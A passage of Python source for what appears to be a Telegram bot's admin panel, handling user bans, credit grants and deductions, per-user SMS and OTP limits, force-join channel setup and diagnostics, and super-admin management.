        set_user_otp_limit(target, None, d)
        save()
        await state.clear()
        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    try:
        lv = int(txt)
        if lv < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Invalid.", parse_mode="HTML")
        return
    set_user_otp_limit(target, lv, d)
    log_audit(d, "set_otp_limit", m.from_user.id, f"uid={target} val={lv}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{target}</code> → {lv}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:premium:(\d+)$"))
async def u_premium_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    k = str(uid)
    cur = d.get("users", {}).get(k, {}).get("premium", False)
    new = not cur
    d.setdefault("users", {}).setdefault(k, {})["premium"] = new
    save()
    try:
        await cq.answer(f"💎 Premium: {'ON' if new else 'OFF'}", show_alert=True)
    except Exception:
        pass
    prefix = cq.data.split(":")[0]
    await safe_edit(cq, _user_detail(d, uid), _user_detail_kb(uid, d, prefix))

# ============================================================
#  BAN / UNBAN
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:ban:(\d+)$"))
async def u_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    target = int(cq.data.split(":")[-1])
    if is_owner(target, d) or is_admin(target, d):
        try:
            await cq.answer("❌ Cannot ban admin!", show_alert=True)
        except Exception:
            pass
        return
    await state.update_data(ban_target=target)
    await state.set_state(S.ban_user_reason)
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    await safe_edit(
        cq,
        f"🚫 <b>Ban</b> <code>{target}</code>\n\n"
        f"Send reason (or <code>skip</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:unban:(\d+)$"))
async def u_unban(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    target = int(cq.data.split(":")[-1])
    if target in d.get("banned", []):
        d["banned"].remove(target)
    d.get("ban_reasons", {}).pop(str(target), None)
    save()
    try:
        await cq.answer("✅ Unbanned!", show_alert=True)
    except Exception:
        pass
    prefix = cq.data.split(":")[0]
    try:
        await cq.bot.send_message(target, f"✅ Unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"🚫 <b>Ban</b>\n\nSend Telegram user ID:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.ban_user)
async def ban_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        bid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Invalid ID.", parse_mode="HTML")
        return
    if is_owner(bid, d) or is_admin(bid, d):
        await state.clear()
        await m.answer(f"❌ Cannot ban admin!", parse_mode="HTML")
        return
    await state.update_data(ban_target=bid)
    await state.set_state(S.ban_user_reason)
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    await m.answer(
        f"Send reason (or <code>skip</code>):",
        reply_markup=kb([(sc("cancel"), back)]),
        parse_mode="HTML",
    )

@R.message(S.ban_user_reason)
async def ban_reason(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    bid = fsmd.get("ban_target")
    reason = (m.text or "").strip()
    if reason.lower() == "skip":
        reason = ""
    await state.clear()
    if bid is None:
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    if bid not in d.get("banned", []):
        d.setdefault("banned", []).append(bid)
    if reason:
        d.setdefault("ban_reasons", {})[str(bid)] = reason[:200]
    log_audit(d, "ban_user", uid, f"target={bid} reason={reason}")
    save()
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await m.answer(
        f"🚫 Banned <code>{bid}</code>",
        reply_markup=bk,
        parse_mode="HTML",
    )
    try:
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await m.bot.send_message(bid, f"🚫 <b>Banned.</b>{rtxt}", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    banned = d.get("banned", [])
    if not banned:
        try:
            await cq.answer("✅ No banned users")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await safe_edit(
        cq,
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
        unban_menu_kb(d, prefix),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    bid = int(cq.data.split(":")[-1])
    if bid in d.get("banned", []):
        d["banned"].remove(bid)
    d.get("ban_reasons", {}).pop(str(bid), None)
    log_audit(d, "unban", uid, f"target={bid}")
    save()
    try:
        await cq.answer("✅ Unbanned!", show_alert=True)
    except Exception:
        pass
    try:
        await cq.bot.send_message(bid, f"✅ Unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  ADD / DEDUCT ALL
# ============================================================
@R.callback_query(F.data == "owner:add_all_credits")
async def add_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_all_credits_amount)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Add credits to ALL users</b>\n\n"
        f"Amount:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.add_all_credits_amount)
async def add_all_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Positive number.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await m.answer(f"❌ No users.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    for us in list(users.keys()):
        add_credits(int(us), amt, d, True, "admin-add-all")
    log_audit(d, "add_credits_all", uid, f"amt={amt} count={len(users)}")
    save()
    note = f"{em(EMOJI_MONEY, '💰')} <b>+{amt} credits!</b>"
    okc = 0
    for us in list(users.keys()):
        try:
            await m.bot.send_message(int(us), note, parse_mode="HTML")
            okc += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} {amt} × {len(users)}\nNotified: {okc}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:deduct_all_credits")
async def deduct_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.deduct_all_credits_amount)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct credits from ALL</b>\n\n"
        f"Amount (only manual-added pool):",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.deduct_all_credits_amount)
async def deduct_all_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.clear()
    cnt = 0
    tot = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for us, ud in d.get("users", {}).items():
        iu = int(us)
        if iu in owners or iu in admins:
            continue
        cur = ud.get("credits", 0)
        man = ud.get("manual_added_credits", 0)
        pool = max(0, cur - man)
        if pool > 0:
            td = min(amt, pool)
            if td > 0:
                ud["credits"] = cur - td
                cnt += 1
                tot += td
    log_audit(d, "deduct_credits_all", uid, f"amt={amt} got={tot} from={cnt}")
    save()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Deducted <b>{tot}</b> from <b>{cnt}</b> users.",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

# ============================================================
#  LIMITS — direct user id
# ============================================================
@R.callback_query(F.data == "owner:set_limit")
async def set_limit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_limit_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>SET SMS LIMIT</b>\n\nUser ID:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.set_limit_uid)
async def set_limit_uid_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    if str(target) not in d.get("users", {}):
        await m.answer(f"❌ User not found.", parse_mode="HTML")
        return
    await state.update_data(limit_target_uid=target)
    cur = get_user_send_limit(target, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
    await state.set_state(S.set_limit_value)
    await m.answer(
        f"{em(EMOJI_LOCK, '🔒')} Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code>:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:set_otp_limit")
async def set_otplimit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_limit_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>SET OTP LIMIT</b>\n\nUser ID:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.set_otp_limit_uid)
async def set_otplimit_uid_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    if str(target) not in d.get("users", {}):
        await m.answer(f"❌ User not found.", parse_mode="HTML")
        return
    await state.update_data(otplimit_target_uid=target)
    cur = get_user_otp_limit(target, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
    await state.set_state(S.set_otp_limit_value)
    await m.answer(
        f"{em(EMOJI_OTP, '🔐')} Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code>:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:list_limits")
async def list_limits(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    lines = [f"{em(EMOJI_LOCK, '📋')} <b>All Limits</b>\n"]
    count = 0
    for us, u in d.get("users", {}).items():
        lim = u.get("max_send_limit")
        olim = u.get("max_otp_limit")
        if lim is None and olim is None:
            continue
        count += 1
        nm = esc(str(u.get("name", "?"))[:18])
        ls = "∞" if lim is None else ("🚫" if lim <= 0 else str(lim))
        os_ = "∞" if olim is None else ("🚫" if olim <= 0 else str(olim))
        lines.append(
            f"👤 <code>{us}</code> {nm}\n"
            f"   SMS: <b>{ls}</b> | OTP: <b>{os_}</b>"
        )
    if count == 0:
        lines.append("<i>No limits set.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:home")]))

# ============================================================
#  FORCE JOIN — main menu
# ============================================================
@R.callback_query(F.data == "owner:fj:menu")
async def fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    bypass = fj.get("bypass", [])
    st = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    strict = "🔒 STRICT" if d.get("settings", {}).get("strict_force_join", True) else "🔓 LOOSE"
    txt = (
        f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\n"
        f"Status: <b>{st}</b> | Mode: <b>{strict}</b>\n"
        f"Channels/Groups: <b>{len(chs)}</b>\n"
        f"Bypass: <b>{len(bypass)}</b>\n\n"
    )
    for c in chs[:8]:
        txt += f"• {esc(c.get('title', 'Channel'))} (<code>{esc(str(c['id'])[:30])}</code>)\n"
    if len(chs) > 8:
        txt += f"<i>+{len(chs) - 8} more</i>\n"
    if not chs:
        txt += "<i>No channels added yet.</i>\n"
    await safe_edit(cq, txt, fj_menu_kb(d))

@R.callback_query(F.data == "owner:fj:toggle")
async def fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    log_audit(d, "fj_toggle", cq.from_user.id, f"enabled={fj['enabled']}")
    save()
    try:
        await cq.answer(f"Force Join {'ON' if fj['enabled'] else 'OFF'}!", show_alert=True)
    except Exception:
        pass
    await fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:add")
async def fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.fj_add_channel)
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '🔗')} <b>Add Channel/Group</b>\n\n"
        f"<b>Step 1/2:</b> Send ID or link\n\n"
        f"Accepted formats:\n"
        f"• <code>@channelusername</code> (public)\n"
        f"• <code>-1001234567890</code> (numeric)\n"
        f"• <code>https://t.me/channelname</code>\n"
        f"• <code>https://t.me/+invite_code</code>\n\n"
        f"⚠️ <b>Bot must be admin in the channel!</b>",
        kb([(sc("cancel"), "owner:fj:menu")]),
    )

@R.message(S.fj_add_channel)
async def fj_add_channel_step1(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    raw = (m.text or "").strip()
    if not raw:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return

    cid_to_store = raw
    if "t.me/" in raw:
        mm = re.search(r"t\.me/([A-Za-z0-9_]+)", raw)
        if mm:
            cid_to_store = "@" + mm.group(1)
    elif raw.lstrip("-").isdigit():
        if raw.startswith("-"):
            cid_to_store = raw
        else:
            cid_to_store = "-100" + raw

    try:
        chat = await m.bot.get_chat(cid_to_store)
        title_probe = chat.title or "Channel"
    except Exception as e:
        await m.answer(
            f"❌ <b>Bot cannot access</b>\n\n"
            f"ID: <code>{esc(cid_to_store)}</code>\n"
            f"Error: <code>{esc(str(e)[:120])}</code>\n\n"
            f"<b>Fix:</b>\n"
            f"1. Bot ko channel me <b>admin</b> banao\n"
            f"2. Verify ID sahi hai\n"
            f"3. Fir try karo",
            parse_mode="HTML",
        )
        return

    try:
        me = await m.bot.get_me()
        bm = await m.bot.get_chat_member(cid_to_store, me.id)
        if bm.status not in ("administrator", "creator"):
            await m.answer(
                f"⚠️ <b>Bot is NOT admin!</b>\n\n"
                f"ID: <code>{esc(cid_to_store)}</code>\n"
                f"Bot status: <b>{bm.status}</b>\n\n"
                f"<b>Bot ko {esc(title_probe)} ka admin banao!</b>",
                parse_mode="HTML",
            )
            return
    except Exception as e:
        await m.answer(
            f"⚠️ Cannot verify bot admin status:\n"
            f"<code>{esc(str(e)[:120])}</code>",
            parse_mode="HTML",
        )
        return

    await state.update_data(fj_channel_id=cid_to_store, fj_channel_title=title_probe)
    await state.set_state(S.fj_add_link)
    await m.answer(
        f"✅ Bot verified in <b>{esc(title_probe)}</b>\n"
        f"🆔 <code>{esc(cid_to_store)}</code>\n\n"
        f"<b>Step 2/2:</b> Send invite link\n\n"
        f"Example: <code>https://t.me/channelname</code>",
        reply_markup=kb([(sc("cancel"), "owner:fj:menu")]),
        parse_mode="HTML",
    )

@R.message(S.fj_add_link)
async def fj_add_link_step2(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    link = (m.text or "").strip()
    if not link:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    if not (link.startswith("http://") or link.startswith("https://")):
        link = "https://" + link
    if "t.me/" not in link:
        await m.answer(
            f"❌ Valid t.me link bhejo.\nExample: <code>https://t.me/channelname</code>",
            parse_mode="HTML",
        )
        return

    fsmd = await state.get_data()
    cid = str(fsmd.get("fj_channel_id", "")).strip()
    title = str(fsmd.get("fj_channel_title", "Channel"))
    if not cid:
        await state.clear()
        await m.answer(f"❌ Expired. Try again.", parse_mode="HTML")
        return

    try:
        ch = await m.bot.get_chat(cid)
        title = ch.title or title
    except Exception:
        pass

    chs = d.setdefault("force_join", {}).setdefault("channels", [])
    chs = [c for c in chs if str(c["id"]) != cid]
    chs.append({
        "id": cid,
        "link": link,
        "title": title,
        "required": True,
    })
    d["force_join"]["channels"] = chs
    log_audit(d, "fj_add_channel", m.from_user.id, f"{cid} {title}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <b>Added!</b>\n\n"
        f"📛 {esc(title)}\n"
        f"🆔 <code>{esc(cid)}</code>\n"
        f"🔗 {esc(link)}\n\n"
        f"💡 <i>Run 'test / diagnose' to verify.</i>",
        reply_markup=kb([
            (sc("test"), "owner:fj:test"),
            (sc("back"), "owner:fj:menu"),
        ]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:fj:remove")
async def fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    chs = d.get("force_join", {}).get("channels", [])
    if not chs:
        try:
            await cq.answer("❌ None added")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for c in chs:
        rows.append([btn(
            f"{c.get('title', 'Channel')[:25]}",
            f"owner:fj:del:{c['id']}",
            EMOJI_CROSS, "🗑",
        )])
    rows.append([btn("back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nTap to remove:",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    cid = cq.data.split("owner:fj:del:", 1)[1]
    chs = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in chs if str(c["id"]) != cid]
    log_audit(d, "fj_del_channel", cq.from_user.id, cid)
    save()
    try:
        await cq.answer("🗑 Removed!")
    except Exception:
        pass
    await fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:test")
async def fj_test(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("🧪 Testing...")
    except Exception:
        pass
    uid = cq.from_user.id
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    if not chs:
        await safe_edit(
            cq,
            "❌ No channels added.",
            kb([(sc("back"), "owner:fj:menu")]),
        )
        return
    lines = [f"{em(EMOJI_WARNING, '🧪')} <b>Force Join Diagnostic</b>\n"]
    me = await cq.bot.get_me()
    for ch in chs:
        cid = ch.get("id")
        title = ch.get("title", "Channel")
        line = f"\n<b>{esc(title)}</b>\n🆔 <code>{esc(str(cid)[:40])}</code>\n"
        try:
            chat = await cq.bot.get_chat(cid)
            line += f"✅ get_chat OK — type: <b>{chat.type}</b>\n"
            if chat.username:
                line += f"🌐 @{chat.username}\n"
        except Exception as e:
            line += f"❌ get_chat: <code>{esc(str(e)[:100])}</code>\n"
            lines.append(line)
            continue
        try:
            bm = await cq.bot.get_chat_member(cid, me.id)
            emoji_ = "✅" if bm.status in ("administrator", "creator") else "⚠️"
            line += f"{emoji_} Bot: <b>{bm.status}</b>\n"
            if bm.status not in ("administrator", "creator"):
                line += f"   <i>→ Make bot admin!</i>\n"
        except Exception as e:
            line += f"❌ bot check: <code>{esc(str(e)[:100])}</code>\n"
        try:
            om = await cq.bot.get_chat_member(cid, uid)
            line += f"👤 Your: <b>{om.status}</b>\n"
        except Exception as e:
            line += f"❌ your check: <code>{esc(str(e)[:100])}</code>\n"
        try:
            ok = await check_member(cq.bot, uid, cid)
            line += f"🔍 check_member: <b>{'JOINED' if ok else 'NOT JOINED'}</b>\n"
        except Exception as e:
            line += f"❌ check_member EXC: {esc(str(e)[:100])}\n"
        lines.append(line)
    lines.append("\n━━━━━━━━━━━━━━━━━━━━")
    lines.append("<b>Rules:</b>")
    lines.append("• Bot must be <b>admin</b>")
    lines.append("• Public: <code>@username</code>")
    lines.append("• Private: <code>-100...</code> ID")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:fj:menu")]))

@R.callback_query(F.data == "owner:fj:bypass")
async def fj_bypass_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    bypass = d.get("force_join", {}).get("bypass", [])
    rows = []
    for u in bypass[:20]:
        rows.append([btn(str(u), f"owner:fj:bypass_del:{u}", EMOJI_CROSS, "🗑")])
    rows.append([btn("add bypass", "owner:fj:bypass_add", EMOJI_PLUS, "➕")])
    rows.append([btn("back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    txt = f"{em(EMOJI_USER, '🔓')} <b>Bypass List</b>\n\nTotal: <b>{len(bypass)}</b>"
    if not bypass:
        txt += "\n\n<i>No users bypass force join.</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:fj:bypass_add")
async def fj_bypass_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.fj_add_bypass)
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '🔓')} <b>Add Bypass</b>\n\n"
        f"Send user ID to bypass force join:",
        kb([(sc("cancel"), "owner:fj:bypass")]),
    )

@R.message(S.fj_add_bypass)
async def fj_bypass_add_do(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    await state.clear()
    byp = d.setdefault("force_join", {}).setdefault("bypass", [])
    if target not in byp:
        byp.append(target)
        log_audit(d, "fj_bypass_add", m.from_user.id, target)
        save()
    await m.answer(
        f"✅ Added <code>{target}</code> to bypass.",
        reply_markup=kb([(sc("back"), "owner:fj:bypass")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:fj:bypass_del:"))
async def fj_bypass_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        target = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    byp = d.setdefault("force_join", {}).setdefault("bypass", [])
    if target in byp:
        byp.remove(target)
        save()
    try:
        await cq.answer("🗑 Removed")
    except Exception:
        pass
    await fj_bypass_menu(cq, state)

@R.callback_query(F.data == "owner:fj:stats")
async def fj_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("⏳")
    except Exception:
        pass
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    users = d.get("users", {})
    if not chs:
        await safe_edit(
            cq,
            "❌ No channels to check.",
            kb([(sc("back"), "owner:fj:menu")]),
        )
        return

    lines = [f"{em(EMOJI_CHART, '📊')} <b>Force Join Stats</b>\n"]
    total = len(users)
    lines.append(f"👥 Total users: <b>{total}</b>\n")

    # batch concurrent with cap 8
    sem = asyncio.Semaphore(8)
    user_keys = list(users.keys())[:100]  # sample up to 100

    for ch in chs:
        title = ch.get("title", "?")
        cid = ch.get("id")

        async def check_one(us):
            async with sem:
                try:
                    ok = await check_member(cq.bot, int(us), cid)
                    return 1 if ok else 0
                except Exception:
                    return 0

        try:
            results = await asyncio.wait_for(
                asyncio.gather(*(check_one(us) for us in user_keys), return_exceptions=True),
                timeout=60,
            )
            joined = sum(1 for r in results if r == 1)
            pending = len(user_keys) - joined
        except asyncio.TimeoutError:
            joined = 0
            pending = len(user_keys)

        lines.append(
            f"\n📢 <b>{esc(str(title)[:30])}</b>\n"
            f"   ✅ {joined} | ⏳ {pending} (checked {len(user_keys)})"
        )

    lines.append(f"\n<i>Sampled up to 100 users per channel.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:fj:menu")]))

# ============================================================
#  OWNERS / ADMINS
# ============================================================
@R.callback_query(F.data == "owner:owners:menu")
async def owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\n"
        f"Total: <b>{len(d.get('owners', []))}/6</b>",
        owners_menu_kb(d),
    )

@R.callback_query(F.data == "owner:owners:add")
async def owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if len(d.get("owners", [])) >= 6:
        try:
            await cq.answer("❌ Max 6!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_owner)
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSend chat ID:",
        kb([(sc("cancel"), "owner:owners:menu")]),
    )

@R.message(S.add_owner)
async def owners_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Valid ID.", parse_mode="HTML")
        return
    if is_owner(nid, d):
        await state.clear()
        await m.answer(f"⚠️ Already!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await m.answer(f"❌ Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(nid)
    log_audit(d, "add_owner", m.from_user.id, nid)
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{nid}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML",
    )
    try:
        await m.bot.send_message(nid, f"👑 <b>You're now a Super Admin!</b>", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        did = int(cq.data.split("owner:owners:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if not is_owner(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if did == MAIN_OWNER or did in SUPER_ADMINS:
        try:
            await cq.answer("❌ Cannot remove main!", show_alert=True)
        except Exception:
            pass
        return
    if did in d["owners"]:
        d["owners"].remove(did)
        log_audit(d, "del_owner", uid, did)
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await owners_menu(cq, state)

@R.callback_query(F.data == "owner:admins:menu")
